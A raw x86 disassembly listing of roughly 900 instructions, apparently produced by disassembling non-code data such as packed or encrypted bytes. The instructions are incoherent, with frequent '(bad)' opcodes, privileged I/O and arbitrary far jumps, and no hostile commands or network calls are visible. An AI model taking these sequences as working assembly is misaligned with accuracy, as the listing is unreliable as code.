  416353:	outs   dx,DWORD PTR ds:[esi]
  416354:	out    dx,al
  416355:	loopne 0x41639b
  416357:	or     bl,BYTE PTR [ebx]
  416359:	inc    edi
  41635a:	fiadd  WORD PTR [eax+ebp*2-0x254c30d]
  416361:	jmp    0x6ec4:0xf79257bd
  416368:	dec    ebx
  416369:	cli    
  41636a:	pop    esi
  41636b:	in     al,dx
  41636c:	push   eax
  41636d:	adc    al,0x9c
  41636f:	test   al,0x7f
  416371:	jns    0x416361
  416373:	mov    esp,0x1658949d
  416378:	add    dh,cl
  41637a:	adc    dh,0xbd
  41637d:	test   eax,0x4a2bf202
  416382:	ds add bl,dl
  416385:	xchg   ecx,eax
  416386:	(bad)  
  416387:	scas   al,BYTE PTR es:[edi]
  416388:	and    BYTE PTR [esi+edx*2+0xa35c8b],dh
  41638f:	xchg   ecx,eax
  416390:	push   cs
  416391:	mov    cl,BYTE PTR [ebx+0x2a]
  416394:	les    esp,FWORD PTR [esi-0x27738034]
  41639a:	xor    DWORD PTR [eax+0x1d],ebp
  41639d:	jb     0x4163e2
  41639f:	jo     0x7036362c
  4163a5:	add    DWORD PTR [ebx-0x234fc2fb],edi
  4163ab:	push   eax
  4163ac:	add    BYTE PTR [edx+esi*2-0x3091f5b2],bl
  4163b3:	lahf   
  4163b4:	xchg   ebp,eax
  4163b5:	cdq    
  4163b6:	cs mov ah,0xb1
  4163b9:	ja     0x416389
  4163bb:	ins    BYTE PTR es:[edi],dx
  4163bc:	inc    esp
  4163bd:	adc    dl,BYTE PTR [ecx-0x7c]
  4163c0:	stos   DWORD PTR es:[edi],eax
  4163c1:	lods   al,BYTE PTR ds:[esi]
  4163c2:	nop
  4163c3:	ss ja  0x41639b
  4163c6:	in     al,0x42
  4163c8:	idiv   BYTE PTR [ebx-0x60]
  4163cb:	jns    0x4163f3
  4163cd:	and    al,0x40
  4163cf:	daa    
  4163d0:	pop    edx
  4163d1:	int    0xac
  4163d3:	mov    dh,0x43
  4163d5:	inc    DWORD PTR [eax+0x42]
  4163d8:	popa   
  4163d9:	dec    edx
  4163da:	ret    
  4163db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163dc:	adc    al,BYTE PTR [eax+0x5e]
  4163df:	mov    edx,0x50ad3127
  4163e4:	stos   DWORD PTR es:[edi],eax
  4163e5:	das    
  4163e6:	cli    
  4163e7:	mov    bh,0x11
  4163e9:	xor    al,0x7d
  4163eb:	dec    ebx
  4163ec:	sbb    eax,DWORD PTR [ebp+0x2e]
  4163ef:	int    0x52
  4163f1:	pop    edx
  4163f2:	gs fwait
  4163f4:	pop    ecx
  4163f5:	push   es
  4163f6:	loop   0x416403
  4163f8:	enter  0xac49,0x55
  4163fc:	push   ecx
  4163fd:	xchg   esi,eax
  4163fe:	enter  0xd449,0x0
  416402:	xchg   ebp,eax
  416403:	push   ebp
  416404:	xor    dh,BYTE PTR [ecx]
  416406:	rcl    BYTE PTR [edx+0x944d0e9],0xe3
  41640d:	lds    ebx,FWORD PTR [edi]
  41640f:	mov    ch,BYTE PTR [edi]
  416411:	push   ss
  416412:	shl    dl,cl
  416414:	scas   al,BYTE PTR es:[edi]
  416415:	aaa    
  416416:	add    DWORD PTR [ebp+edi*8-0x4dd72295],ebx
  41641d:	bound  ebx,QWORD PTR [ebp-0x1e]
  416420:	hlt    
  416421:	mov    al,0x8f
  416423:	fcmove st,st(3)
  416425:	and    DWORD PTR [edx],ebp
  416427:	sbb    esi,DWORD PTR [edi+0x60bf5385]
  41642d:	pushf  
  41642e:	mov    bh,0xca
  416430:	mov    bh,0x33
  416432:	mov    bh,0x43
  416434:	and    DWORD PTR [ebp+0x28],eax
  416437:	fcmove st,st(3)
  416439:	xchg   ax,ax
  41643b:	pushf  
  41643c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41643d:	jg     0x4163e1
  41643f:	add    DWORD PTR [esi],ebp
  416441:	cmc    
  416442:	(bad)  
  416444:	int3   
  416445:	icebp  
  416446:	inc    ebx
  416447:	les    ecx,FWORD PTR [edx]
  416449:	hlt    
  41644a:	add    esp,DWORD PTR [ecx+0x43bc2882]
  416450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416451:	add    esp,ebx
  416453:	fsub   DWORD PTR [ecx-0x7c]
  416456:	xor    DWORD PTR [ebp+0x28],esp
  416459:	loope  0x41648a
  41645b:	in     eax,dx
  41645c:	and    al,0xde
  41645e:	retf   
  41645f:	jg     0x416470
  416461:	js     0x4164af
  416463:	aas    
  416464:	mov    cl,0xaf
  416466:	adc    eax,0x35198999
  41646b:	xchg   DWORD PTR [edx+ecx*2+0x111711f0],ebx
  416472:	ror    DWORD PTR [ebp+0x39],cl
  416475:	es out 0x8d,al
  416478:	mov    edx,0xde857cb7
  41647d:	jle    0x41641d
  41647f:	sbb    BYTE PTR [esi-0x37],0x40
  416483:	es cmc 
  416485:	lods   eax,DWORD PTR ds:[esi]
  416486:	mov    ecx,DWORD PTR [ebx]
  416488:	idiv   BYTE PTR [edx]
  41648a:	js     0x416475
  41648c:	mov    cl,0xf2
  41648e:	aam    0x20
  416490:	rol    cl,0xcd
  416493:	jle    0x416417
  416495:	push   edi
  416496:	inc    edx
  416497:	inc    esp
  416498:	inc    esp
  416499:	in     eax,dx
  41649a:	mov    eax,ds:0xc2a616f7
  41649f:	retf   
  4164a0:	add    eax,DWORD PTR ds:0x7a09e9ff
  4164a6:	sahf   
  4164a7:	sbb    ah,BYTE PTR [edx-0x80]
  4164aa:	or     esp,ebx
  4164ac:	retf   0x23aa
  4164af:	shl    DWORD PTR [edi+0x4b],1
  4164b2:	push   ss
  4164b3:	fidiv  DWORD PTR [edi]
  4164b5:	je     0x416461
  4164b7:	cmp    edi,ebx
  4164b9:	mov    ds,ecx
  4164bb:	jle    0x4164ee
  4164bd:	cmp    esp,edx
  4164bf:	je     0x416447
  4164c1:	sub    BYTE PTR [ecx],dl
  4164c3:	loope  0x41651f
  4164c5:	mov    ds:0xd6ffeaa,eax
  4164ca:	pop    ebx
  4164cb:	cmp    al,0x86
  4164cd:	test   eax,0xabfd1cb2
  4164d2:	dec    ebx
  4164d3:	pop    edi
  4164d4:	dec    ebp
  4164d5:	dec    ebp
  4164d6:	por    mm7,QWORD PTR [esi+ebp*1+0x433314b1]
  4164de:	or     al,0x8d
  4164e0:	pusha  
  4164e1:	or     DWORD PTR [edi+0x1f],edx
  4164e4:	daa    
  4164e5:	jnp    0x41647c
  4164e7:	fstp   QWORD PTR [edi+0x7bc1dc1a]
  4164ed:	jl     0x4164fa
  4164ef:	add    DWORD PTR [ebx],0x60
  4164f2:	retf   
  4164f3:	mov    eax,ds:0x52109395
  4164f8:	sub    DWORD PTR [edx+ebx*4+0x5d],eax
  4164fc:	div    DWORD PTR [edx+0x591656ef]
  416502:	mov    ds:0x1d73d272,al
  416507:	jge    0x4164ad
  416509:	mov    ebx,gs
  41650b:	rcr    DWORD PTR [ebx+edi*2],1
  41650e:	pop    es
  41650f:	pop    esp
  416510:	jbe    0x41651e
  416512:	ror    edx,cl
  416514:	mov    ch,0xf0
  416516:	fimul  DWORD PTR [edi]
  416518:	aaa    
  416519:	iret   
  41651a:	and    al,0xfa
  41651c:	ret    
  41651d:	mov    dl,0x78
  41651f:	add    DWORD PTR [edi],eax
  416521:	dec    ecx
  416522:	xchg   ebx,eax
  416523:	ret    0xa635
  416526:	add    al,0x42
  416529:	sti    
  41652a:	das    
  41652b:	test   BYTE PTR [esi-0x2d975b86],bh
  416531:	pop    ss
  416532:	jne    0x416557
  416534:	scas   eax,DWORD PTR es:[edi]
  416535:	pop    ecx
  416536:	or     DWORD PTR ds:0x1fffbe67,0x7a5f887b
  416540:	pop    ebp
  416541:	inc    ebp
  416542:	mov    dh,0x27
  416544:	jb     0x416517
  416546:	je     0x4165c1
  416548:	mov    ebx,0xa202f7d
  41654d:	ror    BYTE PTR [ebx-0x7fd87223],1
  416553:	retf   0xfad0
  416556:	push   ebp
  416557:	sbb    al,0x84
  416559:	push   ss
  41655a:	push   ebx
  41655b:	cld    
  41655c:	pop    ebx
  41655d:	ss push ebx
  41655f:	dec    esp
  416560:	in     al,dx
  416561:	dec    eax
  416562:	sahf   
  416563:	jnp    0x4164e5
  416565:	jne    0x4165c6
  416567:	xchg   edx,eax
  416568:	dec    edx
  416569:	jb     0x4165b5
  41656b:	dec    edi
  41656c:	sub    BYTE PTR [ebp-0x142379a1],ah
  416572:	imul   esi,DWORD PTR [edi],0x1d1b98cc
  416578:	push   0x3b37c89
  41657d:	or     ah,cl
  41657f:	xchg   BYTE PTR [ebp-0x7d733f52],ch
  416585:	sbb    BYTE PTR [ecx+0x62],dh
  416588:	dec    edi
  416589:	mov    dl,0xb0
  41658b:	fisub  DWORD PTR [edx+eiz*2-0x151d3beb]
  416592:	adc    DWORD PTR [esi-0x6d482959],edi
  416598:	out    dx,al
  416599:	sbb    BYTE PTR [esi],cl
  41659b:	(bad)  
  41659d:	add    DWORD PTR [ecx],eax
  41659f:	jge    0x416545
  4165a1:	sub    edi,DWORD PTR [edi+0x45]
  4165a4:	daa    
  4165a5:	push   ds
  4165a6:	repnz adc BYTE PTR [eax+ebp*8-0x62ffa5bf],bh
  4165ae:	and    eax,0x16f25fc1
  4165b3:	jns    0x4165b1
  4165b5:	cdq    
  4165b6:	jnp    0x416591
  4165b8:	rcr    BYTE PTR [edx+0x6c],cl
  4165bb:	or     bh,BYTE PTR [esi+0x6e]
  4165be:	mov    edi,0xc941b4c6
  4165c3:	inc    edi
  4165c4:	scas   eax,DWORD PTR es:[edi]
  4165c5:	retf   
  4165c6:	hlt    
  4165c7:	lahf   
  4165c8:	not    BYTE PTR [ecx]
  4165ca:	arpl   WORD PTR [ebp+0x74],bp
  4165cd:	jne    0x416627
  4165cf:	in     al,0x3b
  4165d1:	fidivr DWORD PTR [eax+0x5]
  4165d4:	jle    0x4165ae
  4165d6:	aam    0x31
  4165d8:	xchg   esp,eax
  4165d9:	cdq    
  4165da:	nop
  4165db:	push   0x1aa379e2
  4165e0:	xor    al,0x92
  4165e2:	adc    al,0xc3
  4165e4:	hlt    
  4165e5:	bound  ecx,QWORD PTR [ecx+0x7b]
  4165e8:	inc    edi
  4165e9:	inc    ecx
  4165ea:	clc    
  4165eb:	push   eax
  4165ec:	inc    eax
  4165ed:	xchg   ecx,eax
  4165ee:	out    0x4b,al
  4165f0:	xchg   edx,eax
  4165f1:	mov    ah,0xa3
  4165f3:	sti    
  4165f4:	inc    esi
  4165f5:	dec    ebp
  4165f6:	pop    ecx
  4165f7:	lock arpl WORD PTR [esi+0x7b],bx
  4165fb:	push   ds
  4165fc:	ret    0x6070
  4165ff:	or     BYTE PTR [edx+0x5c],bl
  416602:	mov    ebp,0xd4e2d4d3
  416607:	adc    dl,BYTE PTR [eax+0x18a9da5]
  41660d:	aad    0x80
  41660f:	es mov ebx,0xfe32062
  416615:	call   0xdab9e8f1
  41661a:	repz cs enter 0xccb1,0x23
  416620:	outs   dx,DWORD PTR ds:[esi]
  416621:	xor    esi,DWORD PTR [ecx]
  416623:	push   eax
  416624:	test   eax,0x1ee64e87
  416629:	rol    BYTE PTR [ebx+0x23e85dc9],1
  41662f:	adc    ah,BYTE PTR [ecx+0x9e3fd73]
  416635:	or     ch,BYTE PTR [eax+ecx*8+0x152191e5]
  41663c:	stc    
  41663d:	mov    BYTE PTR [ecx+0x23],dl
  416640:	push   eax
  416641:	push   ebx
  416642:	push   eax
  416643:	push   ss
  416644:	mov    edi,0x93eb792c
  416649:	out    0xff,eax
  41664b:	push   esp
  41664c:	sub    eax,0x1df3715f
  416651:	push   ds
  416652:	mov    BYTE PTR [ebx+eiz*8-0x51],ch
  416656:	xchg   esi,eax
  416657:	inc    ecx
  416658:	pusha  
  416659:	lahf   
  41665a:	ja     0x4165ea
  41665c:	std    
  41665d:	sub    BYTE PTR [ebx-0x6b],ah
  416660:	out    0x4a,al
  416662:	mov    edx,0x5c39a773
  416667:	jbe    0x41664d
  416669:	hlt    
  41666a:	and    DWORD PTR [ecx-0x68aa4e40],ebx
  416670:	shl    esp,cl
  416672:	hlt    
  416673:	aaa    
  416674:	push   ds
  416675:	pop    eax
  416676:	repnz popf 
  416678:	xchg   ecx,eax
  416679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41667a:	jl     0x4166f0
  41667c:	in     al,dx
  41667d:	pop    ebp
  41667e:	push   esi
  41667f:	pop    ecx
  416680:	cmp    esp,esi
  416682:	sub    dh,BYTE PTR [edi]
  416684:	call   0x4fce:0x1451f14e
  41668b:	mov    ch,0x2f
  41668d:	dec    esi
  41668e:	dec    esp
  41668f:	outs   dx,BYTE PTR ds:[esi]
  416690:	xor    DWORD PTR [ebp+0x51ed3dac],0x8aa58162
  41669a:	adc    BYTE PTR [edx],dl
  41669c:	jbe    0x4166b8
  41669e:	jmp    DWORD PTR [eax+0x158b8430]
  4166a4:	and    eax,edx
  4166a6:	mov    ch,0x53
  4166a9:	cmp    DWORD PTR [esi+0x5e],ebp
  4166ac:	mov    dl,0x1f
  4166ae:	test   BYTE PTR [esp+ebp*1-0x441e73],ch
  4166b5:	jnp    0x41667b
  4166b7:	enter  0x19,0x3
  4166bb:	adc    al,0xe8
  4166bd:	mov    ebp,0x475f4157
  4166c2:	das    
  4166c3:	in     eax,dx
  4166c4:	cmp    BYTE PTR [ebp+0x67],ch
  4166c7:	dec    ebx
  4166c8:	pop    ebx
  4166c9:	adc    bl,BYTE PTR [edx]
  4166cb:	cmp    ah,BYTE PTR [edx]
  4166cd:	fs repz jle 0x4166f9
  4166d1:	pusha  
  4166d2:	pop    edx
  4166d3:	adc    DWORD PTR [edi-0x163c6776],0x56
  4166da:	mov    al,ds:0x2e2aab25
  4166df:	sbb    al,0x2b
  4166e1:	pop    ss
  4166e2:	sbb    DWORD PTR [eax+0x7f],ebx
  4166e5:	shl    DWORD PTR [edi],cl
  4166e7:	mov    WORD PTR ds:0x571f40c,fs
  4166ed:	jg     0x416703
  4166ef:	adc    ah,BYTE PTR [ebx+0x43]
  4166f2:	jo     0x41671a
  4166f4:	imul   edx,DWORD PTR [edx],0x4e
  4166f7:	mov    ah,0xe9
  4166f9:	mov    cl,0xb0
  4166fb:	add    BYTE PTR [eax-0x2],dl
  4166fe:	xchg   edx,eax
  4166ff:	adc    eax,0x64dbbf67
  416704:	mov    bh,0xab
  416706:	sub    al,0xc0
  416708:	push   ebp
  416709:	test   eax,0x514edc8
  41670e:	mov    edi,0x87d74d42
  416713:	(bad)  
  416714:	(bad)  
  416715:	imul   ecx,DWORD PTR [edi+0x14772838],0xffffff8e
  41671c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41671d:	xor    DWORD PTR [ebx-0x78],edi
  416720:	mov    al,0xa3
  416722:	mov    ebx,0x60b52e3b
  416727:	xchg   DWORD PTR [eax],edi
  416729:	cli    
  41672a:	xor    esi,DWORD PTR [eax+0x64]
  41672d:	dec    ecx
  41672e:	cs adc al,0xaf
  416731:	cmp    eax,0x70112107
  416736:	mov    bl,0xb4
  416738:	div    dl
  41673a:	adc    al,0x24
  41673c:	adc    al,0x9e
  41673e:	xor    BYTE PTR [eax],al
  416740:	or     BYTE PTR ds:0xc817ea72,bh
  416746:	loop   0x416771
  416748:	push   ds
  416749:	ja     0x4167af
  41674b:	push   0xffffff84
  41674d:	lahf   
  41674e:	call   0x85916bd9
  416753:	outs   dx,DWORD PTR ds:[esi]
  416754:	arpl   WORD PTR [edi+0x5d38e1fd],cx
  41675a:	out    0x1a,eax
  41675c:	dec    edx
  41675d:	pop    esp
  41675e:	xchg   ebp,eax
  41675f:	xlat   BYTE PTR ds:[ebx]
  416760:	sbb    eax,0x641795eb
  416765:	icebp  
  416766:	iret   
  416767:	rcr    DWORD PTR [ebx+ebx*1],0x76
  41676b:	and    edi,ebx
  41676d:	(bad)  
  41676e:	jge    0x41673e
  416770:	mov    DWORD PTR [eax+0xa],ebx
  416773:	mul    DWORD PTR [ecx-0x68fc5377]
  416779:	lahf   
  41677a:	adc    eax,0x2e28c623
  41677f:	xchg   esp,eax
  416780:	sbb    DWORD PTR [ebx],esp
  416782:	scas   al,BYTE PTR es:[edi]
  416783:	mov    ebx,0xc1b371bd
  416788:	mov    BYTE PTR [edx-0xf23bdef],dh
  41678e:	hlt    
  41678f:	pminub mm6,mm0
  416792:	add    eax,0x2f6f4d34
  416797:	xlat   BYTE PTR ds:[ebx]
  416798:	lods   eax,DWORD PTR ds:[esi]
  416799:	fisubr DWORD PTR [ebp+0x42]
  41679c:	ins    BYTE PTR es:[edi],dx
  41679d:	scas   eax,DWORD PTR es:[edi]
  41679e:	or     BYTE PTR [edx-0x4e],bl
  4167a1:	popa   
  4167a2:	dec    ebp
  4167a3:	scas   eax,DWORD PTR es:[edi]
  4167a4:	aam    0x44
  4167a6:	ret    0x47a
  4167a9:	(bad)  
  4167aa:	jmp    0x1d6f322f
  4167af:	(bad)  
  4167b0:	jbe    0x41681f
  4167b2:	and    esp,DWORD PTR [edi+ebp*2-0x28de9c1f]
  4167b9:	lods   al,BYTE PTR ds:[esi]
  4167ba:	scas   al,BYTE PTR es:[edi]
  4167bb:	inc    esp
  4167bc:	xchg   esi,eax
  4167bd:	inc    ebp
  4167be:	inc    eax
  4167bf:	mov    eax,ds:0x1f43c40a
  4167c4:	cli    
  4167c5:	cmp    al,0xf
  4167c7:	xchg   ah,ch
  4167c9:	mul    BYTE PTR [edi-0xf18b2dd]
  4167cf:	jge    0x41678b
  4167d1:	scas   al,BYTE PTR es:[edi]
  4167d2:	push   eax
  4167d3:	scas   eax,DWORD PTR es:[edi]
  4167d4:	pop    ebx
  4167d5:	es popa 
  4167d7:	(bad)  
  4167d8:	mov    bh,0x88
  4167da:	(bad)  
  4167db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167dc:	sub    cl,bh
  4167de:	daa    
  4167df:	xchg   ebp,eax
  4167e0:	xor    al,0x45
  4167e2:	sbb    BYTE PTR [ebp+0x778ee3ce],bl
  4167e8:	pop    ds
  4167e9:	in     al,0x78
  4167eb:	mov    bl,BYTE PTR [bx]
  4167ee:	cmp    edx,esi
  4167f0:	or     cl,ch
  4167f2:	rcr    ebp,1
  4167f4:	and    ebx,DWORD PTR [esi]
  4167f6:	xchg   ebp,eax
  4167f7:	inc    esi
  4167f8:	iret   
  4167f9:	repz add al,0x60
  4167fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167fd:	sub    eax,0x710ce156
  416802:	jae    0x4167d6
  416804:	jno    0x4167e9
  416806:	retf   0x8fdd
  416809:	fdivp  st(6),st
  41680b:	in     al,dx
  41680c:	out    dx,eax
  41680d:	out    0x5e,eax
  41680f:	mov    ecx,0x44c56609
  416814:	fadd   st,st(5)
  416816:	add    al,0xbe
  416818:	out    0x47,eax
  41681a:	or     DWORD PTR [ecx-0x7b99a123],ebp
  416820:	xlat   BYTE PTR ds:[ebx]
  416821:	lods   eax,DWORD PTR ds:[esi]
  416822:	jl     0x416861
  416824:	push   eax
  416825:	repnz int 0x6
  416828:	les    ebp,FWORD PTR [edx-0x2d718897]
  41682e:	xor    BYTE PTR [ebx+0x71a9bf05],0xde
  416835:	cmp    eax,0x47886e6a
  41683a:	fadd   DWORD PTR [eax-0x76]
  41683d:	pop    edi
  41683e:	cwde   
  41683f:	(bad)  
  416840:	out    dx,al
  416841:	cmp    ebx,ebx
  416843:	xchg   ecx,eax
  416844:	leave  
  416845:	sbb    esp,ebp
  416847:	fwait
  416848:	push   esi
  416849:	mov    ah,0x6e
  41684b:	sub    eax,0x1b6350df
  416850:	add    al,0x59
  416852:	push   ebp
  416853:	out    dx,al
  416854:	aad    0x6e
  416856:	jmp    0x416834
  416858:	or     al,0x51
  41685a:	iret   
  41685b:	mov    eax,ss
  41685d:	(bad)  [edi]
  41685f:	inc    esp
  416860:	in     eax,dx
  416861:	retf   
  416862:	stos   BYTE PTR es:[edi],al
  416863:	sub    dh,BYTE PTR [edi-0x7a]
  416866:	adc    DWORD PTR [edx*8+0xc149e8c],edx
  41686d:	adc    DWORD PTR [edi-0x61],eax
  416870:	es push 0xfffffff8
  416873:	(bad)  [edi]
  416875:	jnp    0x416898
  416877:	(bad)  
  416878:	rol    BYTE PTR ds:0x40c01aa5,1
  41687e:	sbb    al,0xfd
  416880:	sbb    al,0xb9
  416882:	add    DWORD PTR [ebx+eiz*1+0x297e9fe5],0x52827f6f
  41688d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41688e:	inc    edx
  41688f:	call   0x7964717e
  416894:	push   esp
  416895:	icebp  
  416896:	jb     0x4168cd
  416898:	loopne 0x41688d
  41689a:	cs popa 
  41689c:	and    al,0xcd
  41689e:	cmovno esi,DWORD PTR [ecx]
  4168a1:	inc    edi
  4168a2:	mov    ds:0x3b175484,al
  4168a7:	adc    DWORD PTR [edi-0x27],ebp
  4168aa:	lds    esp,FWORD PTR [eax]
  4168ac:	xchg   esp,eax
  4168ad:	dec    edi
  4168ae:	jne    0x416868
  4168b0:	js     0x416921
  4168b2:	arpl   WORD PTR [ebp+0x52d7d606],bx
  4168b8:	xor    DWORD PTR [edi+0x600601a4],edi
  4168be:	dec    sp
  4168c0:	aaa    
  4168c1:	and    bl,BYTE PTR [edx+0x8c5cbb6]
  4168c7:	and    DWORD PTR [esi],esp
  4168c9:	fiadd  WORD PTR [edi+0xb5dec7c]
  4168cf:	jl     0x41687b
  4168d1:	call   0x3f45cb5
  4168d6:	imul   esp,DWORD PTR [edi-0x2c],0xffffffdc
  4168da:	loope  0x416888
  4168dc:	xchg   BYTE PTR [edi-0x4b],dh
  4168df:	pop    esp
  4168e0:	ins    DWORD PTR es:[edi],dx
  4168e1:	push   cs
  4168e2:	add    al,0xf0
  4168e4:	cs nop
  4168e6:	xchg   edx,eax
  4168e7:	fucom  st(4)
  4168e9:	aas    
  4168ea:	pop    es
  4168eb:	push   ebx
  4168ec:	xor    eax,0x831d6ae4
  4168f1:	test   DWORD PTR [edi+0x4e291357],ebp
  4168f7:	xchg   ebp,edi
  4168f9:	xor    al,0x29
  4168fb:	add    DWORD PTR [esi],ebx
  4168fd:	push   esp
  4168fe:	xlat   BYTE PTR ds:[ebx]
  4168ff:	and    BYTE PTR [esi+0x7cc71f89],ah
  416905:	xchg   ebx,eax
  416906:	jnp    0x4168b8
  416908:	jle    0x416933
  41690a:	outs   dx,DWORD PTR ds:[esi]
  41690b:	outs   dx,DWORD PTR ds:[esi]
  41690c:	aas    
  41690d:	aam    0x8f
  41690f:	push   edi
  416910:	jge    0x4168d6
  416912:	(bad)  
  416914:	int3   
  416915:	in     eax,dx
  416916:	std    
  416917:	mov    bh,0xeb
  416919:	jno    0x4168cb
  41691b:	jmp    0xee5025dd
  416920:	mov    al,0xe
  416922:	test   eax,0xa09fc345
  416927:	inc    esp
  416928:	cmp    eax,0xe47776d6
  41692d:	add    eax,0xe03ac4b0
  416932:	cmp    BYTE PTR [edx],cl
  416934:	mov    DWORD PTR [ebx],edi
  416936:	push   ds
  416937:	pushf  
  416938:	push   0xc4af44e6
  41693d:	mov    ebx,edx
  41693f:	mov    bl,al
  416941:	fmul   QWORD PTR [ebp-0x131bf6a4]
  416947:	xchg   ebx,eax
  416948:	push   edx
  416949:	add    edx,0xa66c53e
  41694f:	icebp  
  416950:	or     al,0x57
  416952:	js     0x4168de
  416954:	xchg   esp,eax
  416955:	(bad)  
  416956:	sbb    al,0x90
  416958:	int    0xbb
  41695a:	inc    esi
  41695b:	or     eax,0xcb7c7a31
  416960:	lods   al,BYTE PTR ds:[esi]
  416961:	adc    dl,al
  416963:	inc    esp
  416964:	into   
  416965:	xor    eax,0x58ea58c
  41696a:	and    edx,DWORD PTR [ebx+0x1]
  41696d:	(bad)  
  41696e:	xlat   BYTE PTR ds:[ebx]
  41696f:	or     BYTE PTR [ecx],0xb2
  416972:	sub    BYTE PTR [edi+0x4b2e52b2],ah
  416978:	(bad)  
  416979:	xlat   BYTE PTR ds:[ebx]
  41697a:	pop    eax
  41697b:	icebp  
  41697c:	cmp    eax,0xbd31fc71
  416981:	rol    BYTE PTR ds:0x85ab985f,0x38
  416988:	loopne 0x416936
  41698a:	dec    ecx
  41698b:	mov    DWORD PTR [edi-0x3cfb6fcd],ebp
  416991:	ret    0xf646
  416994:	aas    
  416995:	(bad)  
  416996:	sbb    DWORD PTR [edi-0x20],edx
  416999:	popa   
  41699a:	add    cl,BYTE PTR [di]
  41699d:	mov    ecx,0x5e84e1b5
  4169a2:	imul   esp,DWORD PTR [ecx+edi*8+0x33869a92],0xc8f8a43d
  4169ad:	mov    ds:0x95a42329,al
  4169b2:	adc    BYTE PTR [ebx-0x26b35782],al
  4169b8:	lods   al,BYTE PTR ds:[esi]
  4169b9:	inc    ebx
  4169ba:	push   cs
  4169bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169bc:	sbb    ebx,DWORD PTR [ecx]
  4169be:	or     edx,esi
  4169c0:	fistp  WORD PTR [eax-0x1d]
  4169c3:	inc    ebx
  4169c4:	retf   
  4169c5:	repz sub DWORD PTR [edx+0x68],ebp
  4169c9:	in     al,dx
  4169ca:	clc    
  4169cb:	mov    cl,0x2d
  4169cd:	clc    
  4169ce:	scas   eax,DWORD PTR es:[edi]
  4169cf:	inc    esi
  4169d0:	push   ebx
  4169d1:	std    
  4169d2:	add    WORD PTR [ebp-0x21],ax
  4169d6:	xchg   ecx,eax
  4169d7:	mov    DWORD PTR [ebx+esi*4],ebx
  4169da:	mov    ds:0xc93e2abb,al
  4169df:	push   esi
  4169e0:	fdivr  DWORD PTR [ecx]
  4169e2:	xor    edx,DWORD PTR [ebp-0x7a]
  4169e5:	jmp    0x2149:0x2d24cc41
  4169ec:	lea    edi,[edi-0xcf4bbd7]
  4169f2:	mov    bl,0x19
  4169f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169f5:	retf   
  4169f6:	fistp  DWORD PTR [esi-0xa]
  4169f9:	jmp    0xcaa9:0x64d138b8
  416a00:	rcr    BYTE PTR [ebp+0x7c73a5a0],cl
  416a06:	sbb    eax,0xb25e7639
  416a0b:	ret    0xbb47
  416a0e:	popa   
  416a0f:	add    bh,dh
  416a11:	push   ecx
  416a12:	nop
  416a13:	and    al,0xad
  416a15:	test   eax,0xc8cad6ea
  416a1a:	std    
  416a1b:	xor    al,0x4d
  416a1d:	in     al,0x7
  416a1f:	sbb    eax,0xb96a3aa2
  416a24:	xor    bl,ah
  416a26:	add    dl,BYTE PTR [eax+edx*1]
  416a29:	and    BYTE PTR ds:0x5aca5b54,bh
  416a2f:	inc    ebp
  416a30:	xor    edx,DWORD PTR [edx]
  416a32:	les    eax,FWORD PTR [esi]
  416a34:	pop    edx
  416a35:	and    bh,BYTE PTR [ecx+0x78]
  416a38:	shl    ah,cl
  416a3a:	mov    cl,0x9c
  416a3c:	popa   
  416a3d:	pop    esi
  416a3e:	dec    ebp
  416a3f:	xchg   esp,eax
  416a40:	jp     0x416a4c
  416a42:	(bad)  
  416a44:	test   DWORD PTR [edi-0x27],eax
  416a47:	jp     0x416aa7
  416a49:	aas    
  416a4a:	rcr    DWORD PTR [ebx+0x7c],1
  416a4d:	or     al,0xe4
  416a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a50:	test   al,0x5b
  416a52:	adc    eax,0x23196624
  416a57:	push   esp
  416a58:	or     al,0xd2
  416a5a:	cmovnp esp,DWORD PTR [edi]
  416a5d:	repnz in eax,0x8c
  416a60:	aaa    
  416a61:	rcr    DWORD PTR [edi+ebx*4],1
  416a64:	cmc    
  416a65:	retf   0xd92a
  416a68:	inc    esi
  416a69:	inc    esp
  416a6a:	movzx  edx,dx
  416a6d:	mov    dh,0x59
  416a6f:	jno    0x416ac1
  416a71:	(bad)
  416a75:	outs   dx,DWORD PTR ds:[esi]
  416a76:	call   DWORD PTR [ebp-0x387a751b]
  416a7c:	mov    ebx,0x6d12d3a5
  416a81:	xchg   BYTE PTR [eax+0x39],dh
  416a84:	fcomp  QWORD PTR [ebx-0x1f]
  416a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a88:	inc    edi
  416a89:	mov    ss,WORD PTR [ebp-0x4fdecec8]
  416a8f:	mov    al,ds:0xb6498cfd
  416a94:	jp     0x416a25
  416a96:	pop    esp
  416a97:	pop    esi
  416a98:	hlt    
  416a99:	inc    esi
  416a9a:	mov    edi,0x77e7e5e1
  416a9f:	inc    eax
  416aa0:	test   DWORD PTR [ebx+0x5b],esi
  416aa3:	pop    ds
  416aa4:	lea    esp,[ebx]
  416aa6:	jl     0x416a70
  416aa8:	mov    ds:0x417e40d0,eax
  416aad:	(bad)
  416ab0:	dec    ebp
  416ab1:	ss push eax
  416ab3:	fsub   DWORD PTR fs:[ebx]
  416ab6:	mov    ecx,DWORD PTR ss:[ebp-0x3ee3415e]
  416abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416abe:	and    esi,ecx
  416ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ac1:	call   0x29fc8e9f
  416ac6:	adc    al,0x55
  416ac8:	(bad)  
  416ac9:	lea    esp,[esi+0x1ff82742]
  416acf:	and    cl,BYTE PTR [edx+ebx*4-0x61]
  416ad3:	ja     0x416ab1
  416ad5:	jp     0x416a9a
  416ad7:	pop    ss
  416ad8:	cmp    DWORD PTR [esi-0xb13361],0xa6a7a567
  416ae2:	js     0x416a7b
  416ae4:	ds loope 0x416add
  416ae7:	test   DWORD PTR [esi+edi*8],0x75f12916
  416aee:	jge    0x416ac8
  416af0:	push   es
  416af1:	dec    ecx
